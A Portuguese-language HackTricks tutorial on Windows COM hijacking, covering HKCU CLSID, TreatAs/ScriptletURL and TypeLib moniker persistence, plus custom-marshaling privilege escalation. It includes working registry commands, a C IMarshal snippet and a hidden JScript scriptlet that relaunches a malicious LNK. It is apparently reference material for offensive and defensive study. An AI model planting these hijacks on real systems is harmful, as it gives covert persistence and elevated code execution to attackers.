# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Procurando componentes COM inexistentes

Como os valores de HKCU podem ser modificados pelos usuários, **COM Hijacking** pode ser usado como um **mecanismo de persistência**. Com o `procmon`, é fácil encontrar registros COM pesquisados que ainda não existem e que poderiam ser criados por um invasor. Filtros clássicos:

- Operações **RegOpenKey**.
- em que o _Result_ é **NAME NOT FOUND**.
- e o _Path_ termina com **InprocServer32**.

Variações úteis durante a busca:

- Procure também chaves **`LocalServer32`** ausentes. Algumas classes COM são servidores fora do processo e iniciarão um EXE controlado por um invasor em vez de uma DLL.
- Além de `InprocServer32`, procure operações de registro **`TreatAs`** e **`ScriptletURL`**. Conteúdos recentes de detecção e análises de malware continuam destacando essas operações porque são muito mais raras do que registros COM normais e, portanto, têm alto valor como indicadores.
- Ao clonar um registro para HKCU, copie o **`ThreadingModel`** legítimo de `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Usar o modelo errado costuma interromper a ativação e tornar o hijack mais perceptível.<sup>[[3]](#references)</sup>
- Em sistemas de 64 bits, inspecione as visualizações de 64 e 32 bits (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` e `HKLM\Software\Classes\WOW6432Node`), pois aplicativos de 32 bits podem resolver um registro COM diferente.

Depois de decidir qual COM inexistente personificar, execute os comandos a seguir. _Tenha cuidado se decidir personificar um COM carregado a cada poucos segundos, pois isso pode ser exagerado._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Componentes COM do Agendador de Tarefas que podem ser sequestrados

As tarefas do Windows usam gatilhos personalizados para chamar objetos COM e, como são executadas pelo Agendador de Tarefas, é mais fácil prever quando serão acionadas.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ao verificar a saída, você pode selecionar uma tarefa que, por exemplo, será executada **sempre que um usuário fizer logon**.

Agora, ao procurar o CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\CLASSES\ROOT\CLSID** e em HKLM e HKCU, normalmente você verá que o valor não existe em HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Então, você pode simplesmente criar a entrada HKCU e, sempre que o usuário fizer logon, seu backdoor será executado.

## Registros COM órfãos e marshaling personalizado

Um registro COM de máquina pode se tornar uma primitiva de plantio de DLL sem que o registro seja alterado. Procure um valor `InprocServer32` cuja DLL esteja ausente e cujo caminho final possa ser criado ou modificado por um usuário com poucos privilégios. Plantar uma DLL com o nome exato faz com que qualquer processo que ative o CLSID carregue código do atacante. No exemplo CrossDevice, o caminho registrado era `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, então um usuário padrão podia criar o subdiretório e a DLL ausentes.<sup>[[5]](#references)</sup>

### Mapas de plugins graváveis como caminhos de ativação COM privilegiados

Um mapa gravável de ID de plugin para CLSID pode permitir que um usuário com menos privilégios escolha qual servidor COM em processo um serviço privilegiado carrega, mesmo quando não é possível editar o registro da classe em toda a máquina.<sup>[[8]](#references)[[9]](#references)</sup> No caso relatado do `InstallService` no Windows 11, usuários padrão podiam modificar `StaticPluginMap`; um ID de plugin não integrado selecionava um CLSID que o serviço `LocalSystem` passava para `CoCreateInstance` com `CLSCTX_INPROC_SERVER` e `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> A DLL registrada é carregada no processo do serviço, em vez de em um host COM separado.<sup>[[10]](#references)</sup>

As condições relevantes são acesso efetivo de gravação ao mapa, uma solicitação de plugin alcançável e um caminho de DLL `InprocServer32` que o usuário com menos privilégios possa controlar.<sup>[[8]](#references)[[9]](#references)</sup> No caso relatado, o registro do CrossDevice acima fornecia a condição referente ao caminho.<sup>[[8]](#references)[[9]](#references)</sup> Um objeto de plugin bem-sucedido precisa expor a interface solicitada, mas a DLL é carregada antes de `CoCreateInstance` ser concluído; não expor essa interface, por si só, não descarta a execução de código durante o carregamento.<sup>[[8]](#references)[[11]](#references)</sup> Esse caminho de despacho do serviço é diferente do caminho de `IMarshal` personalizado abaixo. Para a primitiva separada baseada no caminho do arquivo, consulte [DLL Hijacking](dll-hijacking/).

### `IMarshal` como primitiva de carregamento de DLL entre processos

Normalmente, o COM representa um ponteiro de interface com um `OBJREF` padrão que encaminha o receptor de volta ao objeto original. Um objeto que implementa `IMarshal` pode, em vez disso, produzir um `OBJREF` personalizado. Seu método `GetUnmarshalClass` fornece o CLSID do código que reconstruirá o objeto no processo receptor. Esse CLSID não precisa identificar o objeto original. O COM o resolve como um servidor em processo e carrega a DLL registrada antes de despachar o método de interface solicitado.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Uma implementação maliciosa mínima só precisa substituir o CLSID órfão em `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Envie esse objeto por meio de um parâmetro de método via proxy, como um `[in] IUnknown *`. Outra opção é `CoGetInstanceFromIStorage`, com o objeto custom-marshaled também implementando o suficiente de `IStorage` para passar pelas verificações locais. O unmarshaling automático no servidor remoto resolve o CLSID substituído, então o carregamento da DLL ocorre antes da execução do método de destino.<sup>[[5]](#references)</sup>

A primitiva não se limita a registros ausentes. Ela também pode forçar o destinatário a carregar uma DLL existente de custom-unmarshaler e expor bugs no carregamento ou no caminho de unmarshaling.<sup>[[5]](#references)</sup>

A cadeia exige todas as seguintes condições:<sup>[[5]](#references)</sup>

1. Um CLSID visível para a máquina aponta para uma DLL in-process ausente ou substituível.
2. O atacante pode colocar essa DLL no caminho resolvido.
3. Um servidor COM out-of-process ativável é executado com o nível de privilégio desejado.
4. O servidor aceita custom marshaling e expõe uma chamada via proxy que transporta o objeto do atacante através do limite entre processos.

### Encontrar servidores in-process órfãos

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) e [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) podem enumerar o banco de dados COM da máquina e testar cada servidor usando a resolução normal de módulos do Win32. Isso é preferível a `Test-Path`, pois alguns registros contêm apenas um nome de arquivo e dependem do caminho de pesquisa do loader.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Trate o resultado como uma lista de candidatos, não como prova de explorabilidade. Resolva o caminho como o loader faria e, em seguida, inspecione a DACL do primeiro diretório pai existente e da DLL pretendida, se ela já existir. Um arquivo ausente só é útil quando o atacante pode criar ou substituir o caminho que o COM realmente resolverá.<sup>[[5]](#references)</sup>

### Selecionar e iniciar um receptor privilegiado

Inspecione as classes COM candidatas quanto a `RunAs`, associação a serviços, interfaces disponíveis e proxies RPC. Uma classe configurada para `SYSTEM`, mas não associada a um serviço nomeado, pode falhar na ativação direta porque o RPCSS não consegue iniciá-la. Nesse caso, procure um gatilho sem privilégios que inicie o host, como uma tarefa agendada executável, e reproduza qualquer pré-requisito de evento nomeado ou IPC que mantenha o servidor em execução.<sup>[[5]](#references)</sup>

Por exemplo, a cadeia vulnerável do Shell Create Object Handler iniciava seu host criando o evento global esperado antes de invocar uma tarefa agendada executável pelo usuário.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Mapeie a referência do objeto resultante de volta ao seu host e verifique a identidade e a política de marshaling. Em seguida, enumere as interfaces e converta seus proxies para IDL para encontrar um parâmetro de entrada, como `IUnknown *`, que fará o marshaling do objeto falso.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Proteções contra custom marshaling

Um receiver adequado não deve aceitar custom marshalers não confiáveis. Duas proteções para todo o processo são `EOAC_NO_CUSTOM_MARSHAL` nas capabilities passadas para `CoInitializeSecurity` e `COMGLB_UNMARSHALING_POLICY_STRONG` definido por meio de `IGlobalOptions::Set`. Com símbolos, o estado correspondente pode ser inspecionado em `combase!gCapabilities` e `combase!g_GLBOPT_UnmarshalingPolicy`; o NtObjectManager expõe o resultado como `CustomMarshalAllowed` quando o parser de processos oferece suporte à versão do Windows.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permite que um CLSID seja emulado por outro.<sup>[[4]](#references)</sup> Do ponto de vista ofensivo, isso significa que você pode deixar o CLSID original intacto, criar um segundo CLSID por usuário que aponte para `scrobj.dll` e, em seguida, redirecionar o objeto COM real para o malicioso com `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Isso é útil quando:

- o aplicativo-alvo já instancia um CLSID estável no logon ou na inicialização do aplicativo
- você quer um redirecionamento somente pelo registro, em vez de substituir o `InprocServer32` original
- você quer executar um scriptlet `.sct` local ou remoto por meio do valor `ScriptletURL`

Fluxo de trabalho de exemplo (adaptado de técnicas públicas do Atomic Red Team e de pesquisas mais antigas sobre abuso do registro COM):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notas:

- `scrobj.dll` lê o valor `ScriptletURL` e executa o `.sct` referenciado, então você pode manter o payload como um arquivo local ou buscá-lo remotamente por HTTP/HTTPS.
- `TreatAs` é especialmente útil quando o registro COM original está completo e estável em HKLM, pois você só precisa de um pequeno redirecionamento por usuário, em vez de espelhar toda a árvore.
- Para validar sem esperar pelo acionador natural, você pode instanciar manualmente o ProgID/CLSID falso com `rundll32.exe -sta <ProgID-or-CLSID>`, se a classe de destino for compatível com ativação STA.

## COM TypeLib Hijacking (script: moniker persistence)

As bibliotecas de tipos (TypeLib) definem interfaces COM e são carregadas por meio de `LoadTypeLib()`. Quando um servidor COM é instanciado, o sistema operacional também pode carregar a TypeLib associada consultando as chaves do registro em `HKCR\TypeLib\{LIBID}`. Se o caminho da TypeLib for substituído por um **moniker**, por exemplo, `script:C:\...\evil.sct`, o Windows executará o scriptlet quando a TypeLib for resolvida — criando uma persistência furtiva acionada quando componentes comuns são acessados.

Isso foi observado contra o controle Microsoft Web Browser (frequentemente carregado pelo Internet Explorer, por aplicativos que incorporam o WebBrowser e até pelo `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Etapas (PowerShell)

1) Identifique a TypeLib (LIBID) usada por um CLSID de alta frequência. Exemplo de CLSID frequentemente abusado por cadeias de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Configure o caminho TypeLib por usuário para apontar para um scriptlet local usando o moniker `script:` (não são necessários privilégios de administrador):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Coloque um `.sct` mínimo em JScript que relance seu payload principal (por exemplo, um `.lnk` usado pela cadeia inicial):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Acionamento – abrir o IE, um aplicativo que incorpore o controle WebBrowser ou até mesmo uma atividade rotineira do Explorer carregará a TypeLib e executará o scriptlet, rearmando sua cadeia no logon/reinicialização.

Limpeza
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notas
- Você pode aplicar a mesma lógica a outros componentes COM de alta frequência; sempre resolva primeiro o `LIBID` real em `HKCR\CLSID\{CLSID}\TypeLib`.
- Em sistemas de 64 bits, você também pode preencher a subchave `win64` para consumidores de 64 bits.

## References

- [1] [Sequestre a TypeLib – Nova técnica de persistência COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Campanha ZipLine: um ataque sofisticado de phishing direcionado a empresas dos EUA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisitando o sequestro de COM (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Chave CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Técnicas de exploração do Windows: registros de objetos COM pendentes](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - Interface IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Especificações abertas da Microsoft - OBJREF do MS-DCOM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [PoC do Dark Elevator e análise técnica (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: escalonamento local de privilégios no serviço de instalação do Windows (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Enumeração de CLSCTX (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Função CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

